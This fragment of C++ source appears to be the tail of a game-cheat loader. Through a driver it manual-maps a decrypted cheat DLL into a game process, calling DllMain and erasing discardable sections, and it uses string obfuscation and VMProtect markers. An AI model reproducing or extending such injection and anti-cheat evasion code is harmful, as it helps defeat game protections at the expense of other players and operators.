                                                                    DecObj.clear();
                                                                    print::set_error(xorstr_(" [RI-1] Something went wrong. Please try again later."));
                                                                    Sleep(4000);
                                                                    exit(43);
                                                                }
                                                                if (!resolve_import(thread_id, CheatBytes, dll_nt_head))
                                                                {
                                                                    driver().free_memory_ex(allocate_base);
                                                                    VirtualFree(CheatBytes, 0, MEM_RELEASE);
                                                                    memset(CheatBytes, 0x00, 50000);
                                                                    DecObj.clear();
                                                                    print::set_error(xorstr_(" [RI-2] Something went wrong. Please try again later."));
                                                                    Sleep(4000);
                                                                    exit(43);
                                                                }
                                                                write_sections(allocate_base, CheatBytes, dll_nt_head);
                                                                call_dll_main(thread_id, allocate_base, dll_nt_head, true);

                                                                erase_discardable_sect(allocate_base, dll_nt_head);
                                                                VirtualFree(CheatBytes, 0, MEM_RELEASE);
                                                                memset(CheatBytes, 0x00, 50000);
                                                                DecObj.clear();
                                                                //SendLog(username.c_str(), xorstr_("INJSUC"));
                                                                exit(43);

                                                                //Clean
                                                            }
                                                            else {
                                                                print::set_error(xorstr_("\n [ERROR] Game not found.\n")); Sleep(1000); goto gerisar;
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    VMProtectEnd();
}